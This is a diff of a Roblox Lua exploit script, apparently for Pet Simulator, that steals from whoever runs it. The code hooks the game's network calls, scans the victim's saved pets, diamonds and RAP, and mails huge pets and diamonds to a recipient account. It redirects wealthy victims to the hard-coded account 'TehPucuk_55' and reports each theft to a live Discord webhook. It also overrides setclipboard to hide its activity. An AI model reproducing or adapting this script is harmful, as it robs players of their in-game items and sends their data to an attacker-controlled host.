@@ -1,24 +1,20 @@
-local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
-local Fire = Network.Fire
-old = hookfunction(getupvalue(Fire, 1), function(...) 
-    return true 
-end)
-
+local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
-local CoreGui = game:GetService("CoreGui")
-local RobloxGui = CoreGui.RobloxGui
 local Client = Players.LocalPlayer
-local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
-local Fire = Network.Fire
-local lockedCount = 0
-local Invoke = Network.Invoke
-local Library = require(game.ReplicatedStorage.Framework.Library)
-local SendMail = getupvalue(Library.Network.Invoke, 2)("Send Mail");
-local LockPet = getupvalue(Library.Network.Invoke, 2)("Lock Pet");
-local pets = {}
-local player = game:GetService("Players").LocalPlayer
+
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
+end
 
 if getgenv().executed then return end
 getgenv().executed = true
@@ -61,13 +57,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = UserName
+    UserName = _G.UserName
 end
 if UserName2 == nil then
-    UserName2 = UserName2
+    UserName2 = _G.UserName2
 end
 if Webhook == nil then
-    Webhook = Webhook
+    Webhook = _G.Webhook
 end
 -- User Checks
 
@@ -1112,15 +1108,17 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     end
 end
 
--- Sending The Pets
+local titanicin
+local bananin
+local hugein
+local pogin
+local excin
+local eventin
+local secretin
+local mythicin
+local gemsin
+local mailmsg = "Monzz"
 
-local ndUser
-if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
-    ndUser = UserName2
-else
-    ndUser = UserName
-end
-local user
 -- Gems Only
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
@@ -1135,7 +1133,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = "TehPucuk_55",
+            ["Recipient"] = user,
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1155,7 +1153,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1183,7 +1181,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1213,7 +1211,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1242,7 +1240,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1270,7 +1268,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1298,7 +1296,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1326,7 +1324,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1354,10 +1352,10 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = "TehPucuk_55",
+                        ["Recipient"] = user,
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
-                        ["Message"] = "Monz Better",
+                        ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
